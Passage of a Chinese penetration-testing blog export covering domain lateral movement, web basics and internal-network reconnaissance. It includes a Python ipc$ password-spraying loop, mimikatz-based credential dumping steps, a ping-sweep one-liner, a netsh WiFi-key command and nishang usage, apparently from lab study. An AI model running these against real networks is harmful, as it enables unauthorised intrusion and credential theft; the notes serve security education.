<h3 id="攻击流程（已有一台服务器权限）"><a href="#攻击流程（已有一台服务器权限）" class="headerlink" title="攻击流程（已有一台服务器权限）"></a>攻击流程（已有一台服务器权限）</h3><ol>
<li><p>使用mimikatz获取密码（明文+密文）</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002315030.png" alt="image-20220310002315030"></p>
<p>得到密码，并作记录</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002349383.png" alt="image-20220310002349383"></p>
</li>
<li><p>用自带命令探针同网段下存活主机</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002735038.png" alt="image-20220310002735038"></p>
</li>
<li><p>使用自带语法+atexec，批量检测多ip对应一明文。这里将ip都存放在同一文件内，执行如下bat文件</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003002026.png" alt="image-20220310003002026"></p>
</li>
<li><p>执行完后，探针到另一台服务器也有相同密码</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003127002.png" alt="image-20220310003127002"></p>
</li>
<li><p> 如法炮制，在新地址上传mimikatz获取新密码，密码字典+1芜湖</p>
</li>
</ol>
<p>   <img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003404796.png" alt="image-20220310003404796"></p>
<ol start="6">
<li><p>再故技重施，用新密码重新完成步骤3的工作，成功得到域控的权限，到此基本结束</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003652617.png" alt="image-20220310003652617"></p>
</li>
</ol>
<p>注意：真实环境不会这么快这么简单，但思路差不多</p>
<h2 id="横向渗透明文、Hash传递批量利用-升级版"><a href="#横向渗透明文、Hash传递批量利用-升级版" class="headerlink" title="横向渗透明文、Hash传递批量利用-升级版"></a>横向渗透明文、Hash传递批量利用-升级版</h2><p>考虑到前文的批处理只有一个变量，导致检测效率很低，所以我们选择python来写，将用户名、密码、ip地址都定义为变量提高效率，还可以使用多线程</p>
<p>利用py脚本制作的exe文件批量尝试横向渗透</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用代码</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.安装pyinstaller</span></span><br><span class="line"><span class="string">pip install pyinstaller</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.生成可执行EXE</span></span><br><span class="line"><span class="string">Pyinstaller -F py文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3.会生成一个同名的exe文件</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.33&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;<span class="comment"># 通过net user /domain收集</span></span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> pas <span class="keyword">in</span> passs:</span><br><span class="line">            <span class="built_in">exec</span>=<span class="string">&quot;net use \\&quot;</span>+<span class="string">&quot;\\&quot;</span>+ip+<span class="string">&quot;\ipc$&quot;</span>+pas+<span class="string">&quot;/user:god\\&quot;</span>+user</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+<span class="built_in">exec</span>+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://gitee.com/RichChigga/impacket-examples-windows">impacket-examples-windows</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>小迪安全</p>
<p><a href="https://www.sohu.com/a/515863300_99907709">域内横向移动_ipc$_命令_目标</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>基础入门</title>
    <url>/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>基础入门</p>
<span id="more"></span>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="Host和DNS的关系"><a href="#Host和DNS的关系" class="headerlink" title="Host和DNS的关系"></a>Host和DNS的关系</h3><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><p>asp <strong>php</strong> aspx jsp <strong>javaweb</strong> pl <strong>py</strong> cgi</p>
<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>免杀</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>网站源码：分脚本类型、应用方向</p>
<p>操作系统：windows、linux</p>
<p>中间件（搭建平台）：apache、iis、tomcat、nginx</p>
<p>数据库：access、mysql、mssql、oracle、sybase、db2、postsql</p>
<p>​    </p>
<h2 id="web安全相关漏洞"><a href="#web安全相关漏洞" class="headerlink" title="web安全相关漏洞"></a>web安全相关漏洞</h2><h3 id="web源码类对应漏洞"><a href="#web源码类对应漏洞" class="headerlink" title="web源码类对应漏洞"></a>web源码类对应漏洞</h3><p>SQL注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</p>
<h3 id="web中间件对应漏洞"><a href="#web中间件对应漏洞" class="headerlink" title="web中间件对应漏洞"></a>web中间件对应漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层对应漏洞"><a href="#web系统层对应漏洞" class="headerlink" title="web系统层对应漏洞"></a>web系统层对应漏洞</h3><p>提权</p>
<h3 id="其他第三方漏洞"><a href="#其他第三方漏洞" class="headerlink" title="其他第三方漏洞"></a>其他第三方漏洞</h3><h3 id="APP或PC应用结合类"><a href="#APP或PC应用结合类" class="headerlink" title="APP或PC应用结合类"></a>APP或PC应用结合类</h3><p>有些app是网页套壳，可以通过工具逆向出相关网页，进行web攻击</p>
<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><h3 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h3><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%851.jpg" alt="数据包1"></p>
<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p>建立连接-&gt;发送请求数据包-&gt;返回响应数据包-&gt;关闭连接</p>
<h4 id="https"><a href="#https" class="headerlink" title="https"></a>https</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%95%B0%E6%8D%AE%E5%8C%852.JPG" alt="数据包2"></p>
<h3 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h3><h4 id="请求行：请求类型-请求资源路径、协议的版本和类型"><a href="#请求行：请求类型-请求资源路径、协议的版本和类型" class="headerlink" title="请求行：请求类型/请求资源路径、协议的版本和类型"></a>请求行：请求类型/请求资源路径、协议的版本和类型</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E8%A1%8C.png" alt="请求行"></p>
<p>用burp改包成POST传参时，需要添加<code>Content-Type: application/x-www-form-urlencoded</code>，并且空一行填入参数值</p>
<h4 id="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"><a href="#请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义" class="headerlink" title="请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义"></a>请求头：一些键值对，浏览器与web服务器之间都可以发送。特定的某种含义</h4><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-1.png" alt="请求头-1"></p>
<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-2.png" alt="请求头-2"></p>
<p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E8%AF%B7%E6%B1%82%E5%A4%B4-3.png" alt="请求头-3"></p>
<h4 id="空行：请求头与请求实体之间用一个空行隔开"><a href="#空行：请求头与请求实体之间用一个空行隔开" class="headerlink" title="空行：请求头与请求实体之间用一个空行隔开"></a>空行：请求头与请求实体之间用一个空行隔开</h4><p>最后一个请求头标之后，发送回车符和退行，通知服务器以下不再有头标</p>
<h4 id="请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123"><a href="#请求体：请求体：要发送的数据（一般post提交会使用），例如：user-123-amp-pass-123" class="headerlink" title="请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123"></a>请求体：请求体：要发送的数据（一般post提交会使用），例如：user=123&amp;pass=123</h4><p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
<h3 id="Response响应数据包"><a href="#Response响应数据包" class="headerlink" title="Response响应数据包"></a>Response响应数据包</h3><h4 id="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"><a href="#状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔" class="headerlink" title="状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔"></a>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</h4><h5 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h5><p>1xx    信息，请求收到，继续处理</p>
<p>2xx    成功，行为被成功地执行</p>
<p>3xx    重定向，为了完成请求，必须进一步执行的动作</p>
<p>4xx    客户端错误</p>
<p>5xx    服务端错误</p>
<p>200    存在文件</p>
<p>403    存在文件夹</p>
<p>3xx    均可能存在</p>
<p>404    不存在文件及文件夹</p>
<p>500    均可能存在</p>
<h4 id="响应头标：包含服务器类型、日期、长度、内容类型等"><a href="#响应头标：包含服务器类型、日期、长度、内容类型等" class="headerlink" title="响应头标：包含服务器类型、日期、长度、内容类型等"></a>响应头标：包含服务器类型、日期、长度、内容类型等</h4><p>和请求头标一样，它们指出服务器的功能，标识出相应的细节</p>
<h4 id="空行响应头与响应体之间用空行隔开"><a href="#空行响应头与响应体之间用空行隔开" class="headerlink" title="空行响应头与响应体之间用空行隔开"></a>空行响应头与响应体之间用空行隔开</h4><p>最后一个响应头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标</p>
<h4 id="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"><a href="#响应数据：浏览器会将实体内容中的数据取出来，生成相应页面" class="headerlink" title="响应数据：浏览器会将实体内容中的数据取出来，生成相应页面"></a>响应数据：浏览器会将实体内容中的数据取出来，生成相应页面</h4><p>HTML文档和图像等，也就是HTML本身</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/web%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.png" alt="web攻击思路"></p>
<p>ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
<p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
<p>开源，为开源问题，框架（找框架漏洞）非框架（找代码漏洞）问题，关于CMS（开源程序，能在网上找到源码，可在网上查找这些开源代码的漏洞）识别问题及后续等</p>
<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><p><img src="/2021/08/19/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.png" alt="渗透思路"></p>
<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>判断系统：在URL中替换大小写，win下不区分，liunx下区分</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>ASP+Access</p>
<p>php+mysql</p>
<p>aspx+mssql</p>
<p>jsp+mssql,oracle</p>
<p>python+mongodb</p>
<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><p>mysql    3306</p>
<p>oracle    1521</p>
<p>sqlsever    1433</p>
<h2 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h2><p>实际应用URL地址参数加密</p>
<p>搜索特定关键字加密字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:id=MQ==</span><br><span class="line">MQ==是BASE64编码的1</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>域环境&amp;工作组&amp;局域网探针方式</title>
    <url>/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&amp;%E5%B7%A5%E4%BD%9C%E7%BB%84&amp;%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309121939190.png" alt="image-20220309121939190"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309122009623.png" alt="image-20220309122009623"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309122025219.png" alt="image-20220309122025219"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309122247396.png" alt="image-20220309122247396"></p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><p>是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非<strong>安全系统与安全系统之间的缓冲区</strong>。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p>
<h3 id="工作组和域环境"><a href="#工作组和域环境" class="headerlink" title="工作组和域环境"></a>工作组和域环境</h3><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><ul>
<li>工作组有时也叫对等网络，因为每台计算机的角色是对等的，他们的资源和管理分散在各个计算机上</li>
<li>用户账户的任何变化，例如修改密码或添加新的账户必须在每台计算机上操作</li>
<li>工作组中的每台计算机都维护一个本地安全数据库（我理解为可以登录的账户信息和共享的资源信息），这就分散了用户账户和资源安全的管理，在每台用户需要访问的计算机上，用户都必须使用此用户账户。</li>
</ul>
<h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><ul>
<li>域模型就是针对大型网络的管理需求而设计的，域就是共享用户账号，计算机账号和安全策略的计算机集合</li>
<li>域提供了集中的管理——因为所有的用户信息都被集中存储</li>
<li>只要用户账户有对资源的适当权限，使用账户都能登录域内的任一台计算机，都可以访问网络上另一计算机的资源。</li>
<li>域提供了可伸缩性，可以创建非常大的网络。</li>
</ul>
<p>域中有三种计算机：</p>
<ul>
<li>域控制器：域控制器上存储着Active Directory；</li>
<li>成员服务器：负责提供邮件，数据库，DHCP等服务；</li>
<li>工作站：是用户使用的客户机。</li>
</ul>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/weixin_42767604/article/details/110009083"> 工作组与域的区别和联系</a></p>
<h3 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h3><p>存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息</p>
<h3 id="域控制器DC"><a href="#域控制器DC" class="headerlink" title="域控制器DC"></a>域控制器DC</h3><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录的计算机称为域控制器。</p>
<p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p>
<h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line">net <span class="built_in">start</span> 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br></pre></td></tr></table></figure>

<h2 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h2><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备</p>
<p><code>ipconfig /all</code> ，判断是否存在域：根据是否有<strong>主DNS后缀</strong>信息来判断</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309153915242.png" alt="image-20220309153915242"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309175601200.png" alt="image-20220309175601200"></p>
<p><code>net view /domain</code>，通过能否成功返回说明存在域</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309175737329.png" alt="image-20220309175737329"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309175802103.png" alt="image-20220309175802103"></p>
<p><code>net time /domain</code>，判断主域：返回主域的时间，可以确定主域名，配合<code>nslookup 域名</code>和<code>ping 域名</code>命令确定IP地址</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309180724121.png" alt="image-20220309180724121"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309180801291.png" alt="image-20220309180801291"></p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309181138587.png" alt="image-20220309181138587"></p>
<p><code>netstat -ano</code>，当前本地网络端口开放</p>
<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E7%8E%AF%E5%A2%83&%E5%B7%A5%E4%BD%9C%E7%BB%84&%E5%B1%80%E5%9F%9F%E7%BD%91%E6%8E%A2%E9%92%88%E6%96%B9%E5%BC%8F/image-20220309181242810.png" alt="image-20220309181242810"></p>
<p>信息收集可以帮助我们了解当前是web服务器还是个人主机等，以便确定正确的攻击思路</p>
<h2 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h2><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统默认常见用户身份：</span></span><br><span class="line"></span><br><span class="line">Domain Admins：域管理员（默认对域控制器有完全控制权）</span><br><span class="line"></span><br><span class="line">Domain Computers：域内机器</span><br><span class="line"></span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line"></span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line"></span><br><span class="line">Domain Users：域用户</span><br><span class="line"></span><br><span class="line">Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关用户手机操作命令</span></span><br><span class="line">系统默认常见用户身份：</span><br><span class="line"></span><br><span class="line">Domain Admins：域管理员（默认对域控制器有完全控制权）</span><br><span class="line"></span><br><span class="line">Domain Computers：域内机器</span><br><span class="line"></span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line"></span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line"></span><br><span class="line">Domain Users：域用户</span><br><span class="line"></span><br><span class="line">Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</span><br></pre></td></tr></table></figure>

<h2 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h2><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备</p>
<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>计算机用户、密码，HASH，明文获取：<a href="https://github.com/gentilkiwi/mimikatz">mimikatz(win)</a>，<a href="https://github.com/huntergregal/mimipenguin">mimipenguin(linux)</a></p>
<p>计算机各种协议服务口令获取：<a href="https://github.com/AlessandroZ/LaZagne">LaZagne(all)</a>，<a href="https://xenarmor.com/">XenArmor(win)</a></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>对于这类信息收集脚本大部分需要有较高的权限才能执行，所以一般在获取webshell后还需进一步拿到更高权限（administrator、system），这些脚本才有用武之地</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Netsh WLAN show profiles 查看自己电脑连接过的wifi</span><br><span class="line"></span><br><span class="line">Netsh WLAN show profile name=<span class="string">&quot;无线名称&quot;</span> key=<span class="built_in">clear</span> 查看自己电脑连接过的wifi密码，其中的“关键内容”对应的就是密码。</span><br></pre></td></tr></table></figure>



<h3 id="收集目标"><a href="#收集目标" class="headerlink" title="收集目标"></a>收集目标</h3><ol>
<li><p>站点源码备份文件、数据库备份文件等</p>
</li>
<li><p>各类数据库 Web 管理入口，如PHPMyAdmin</p>
</li>
<li><p>浏览器保存密码、浏览器 Cookies</p>
</li>
<li><p>其他用户会话、3389 和 ipc$连接记录、回收站内容</p>
</li>
<li><p>Windows 保存的 WIFI 密码</p>
</li>
<li><p>网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</p>
</li>
</ol>
<p>可以收集这些密码来生成一个字典配合后期爆破工作</p>
<h2 id="探针主机域控架构服务操作"><a href="#探针主机域控架构服务操作" class="headerlink" title="探针主机域控架构服务操作"></a>探针主机域控架构服务操作</h2><p><strong>为后续横向思路做准备</strong>，针对应用，协议等各类攻击手法</p>
<h3 id="针对域控制器名及地址信息"><a href="#针对域控制器名及地址信息" class="headerlink" title="针对域控制器名及地址信息"></a>针对域控制器名及地址信息</h3><h4 id="第三方工具（需要考虑免杀）"><a href="#第三方工具（需要考虑免杀）" class="headerlink" title="第三方工具（需要考虑免杀）"></a>第三方工具（需要考虑免杀）</h4><p><code>nbtscan 192.168.x.0/24</code></p>
<p>nmap、masscan</p>
<h4 id="系统自带命令"><a href="#系统自带命令" class="headerlink" title="系统自带命令"></a>系统自带命令</h4><p><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot;</code></p>
<h4 id="第三方PowerShell脚本nishang-empire等"><a href="#第三方PowerShell脚本nishang-empire等" class="headerlink" title="第三方PowerShell脚本nishang  empire等"></a>第三方PowerShell脚本nishang  empire等</h4><p>一般需要高系统权限才能执行</p>
<h5 id="nishang使用方法"><a href="#nishang使用方法" class="headerlink" title="nishang使用方法"></a>nishang使用方法</h5><p>打开“Windows PowerShell”，来到软件所在的目录（可以Tab键补全）</p>
<pre><code>cd .\Desktop\nishang-master
</code></pre>
<p>导入模块nishang</p>
<pre><code>Import-Module .\nishang.psm1
</code></pre>
<p>设置执行策略（初次执行或导入不了时）</p>
<pre><code>Set-ExecutionPolicy RemoteSigned
</code></pre>
<p>获取模块nishang的命令函数</p>
<pre><code>Get-Command -Module nishang
</code></pre>
<p>成功进入后，输入对应的参数使用功能</p>
<p>获取常规计算机信息</p>
<pre><code>Get-Information
</code></pre>
<p>端口扫描（查看目录对应文件有演示语法，其他同理）</p>
<pre><code>Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort
</code></pre>
<p>其他功能：删除补丁，反弹 Shell，凭据获取等</p>
<h2 id="探针域内主机角色及服务信息"><a href="#探针域内主机角色及服务信息" class="headerlink" title="探针域内主机角色及服务信息"></a>探针域内主机角色及服务信息</h2><p>利用<strong>开放端口服务</strong>及<strong>计算机名</strong>判断</p>
<p>核心业务机器：</p>
<ol>
<li>高级管理人员、系统管理员、财务/人事/业务人员的个人计算机</li>
<li>产品管理系统服务器</li>
<li>办公系统服务器</li>
